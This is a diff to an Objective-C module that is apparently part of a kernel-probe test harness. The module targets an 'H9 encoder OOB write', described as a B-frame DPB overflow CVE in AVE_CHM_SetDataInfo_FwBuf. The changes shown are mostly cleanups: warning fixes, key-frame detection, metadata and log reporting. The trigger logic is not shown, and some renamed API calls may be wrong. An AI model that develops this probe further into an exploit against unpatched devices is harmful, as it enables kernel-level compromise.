@@ -23,6 +23,7 @@ static void H9EncodeCallback(void *outputCallbackRefCon,
                              OSStatus status,
                              VTEncodeInfoFlags infoFlags,
                              CMSampleBufferRef sampleBuffer) {
+    (void)outputCallbackRefCon; (void)sourceFrameRefCon;
     if (status != noErr) {
         H9Log(@"  [cb] encode status=%d flags=0x%x", (int)status, (unsigned)infoFlags);
         return;
@@ -30,14 +31,39 @@ static void H9EncodeCallback(void *outputCallbackRefCon,
     if (sampleBuffer) {
         CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sampleBuffer);
         size_t size = bb ? CMBlockBufferGetDataLength(bb) : 0;
-        BOOL isKey = CFDictionaryContainsKey(CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, true) ?
-            (__bridge CFDictionaryRef)CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, true).firstObject : NULL,
-            kCMSampleAttachmentKey_NotSync) == false;
+        CFArrayRef attachments = CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, true);
+        BOOL isKey = true;
+        if (attachments && CFArrayGetCount(attachments) > 0) {
+            CFDictionaryRef att = (CFDictionaryRef)CFArrayGetValueAtIndex(attachments, 0);
+            if (att && CFDictionaryContainsKey(att, kCMSampleAttachmentKey_NotSync)) {
+                isKey = false;
+            }
+        }
         H9Log(@"  [cb] frame encoded: %zu bytes key=%d", size, isKey);
     }
 }
 
 @implementation KPH9EncoderModule
+
+@synthesize identifier = _identifier;
+@synthesize subtitle = _subtitle;
+@synthesize icon = _icon;
+@synthesize section = _section;
+
+- (instancetype)init {
+    self = [super init];
+    if (self) {
+        _identifier = @"h9encoder.oob";
+        _subtitle = @"B-frame DPB MBStats overflow (CVE-2026-112705-adjacent)";
+        _icon = @"video";
+        _section = KPTestSectionKernelProbes;
+    }
+    return self;
+}
+
+- (instancetype)initWithNameSweep {
+    return [self init];
+}
 
 - (NSString *)title { return @"H9 encoder OOB write"; }
 - (NSString *)desc { return @"B-frame DPB MBStats overflow (CVE in AVE_CHM_SetDataInfo_FwBuf, fixed 913.48.1)"; }
@@ -125,7 +151,7 @@ static void H9EncodeCallback(void *outputCallbackRefCon,
 
     int fps = 30;
     n = CFNumberCreate(NULL, kCFNumberSInt32Type, &fps);
-    VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedSourceFrameRate, n);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, n);
     CFRelease(n);
 
     // Use High profile for more ref frames
@@ -216,7 +242,7 @@ static void H9EncodeCallback(void *outputCallbackRefCon,
     int nalTypes[] = { 32, 33, 34 }; // VPS=32, SPS=33, PPS=34
 
     CMFormatDescriptionRef fmtDesc = NULL;
-    OSStatus status = CMVideoFormatDescriptionCreateWithHEVCParameterSets(
+    OSStatus status = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
         kCFAllocatorDefault,
         3,          // num param sets
         paramSets,
@@ -335,7 +361,16 @@ static void H9EncodeCallback(void *outputCallbackRefCon,
 }
 
 - (NSString *)logAt:(NSInteger)idx {
-    return (idx >= 0 && idx < g_h9_logs.count) ? g_h9_logs[idx] : nil;
+    return (idx >= 0 && (NSUInteger)idx < g_h9_logs.count) ? g_h9_logs[idx] : nil;
+}
+
+- (NSString *)runReport {
+    NSMutableString *r = [NSMutableString string];
+    for (NSString *s in g_h9_logs) {
+        [r appendString:s];
+        [r appendString:@"\n"];
+    }
+    return r;
 }
 
 @end
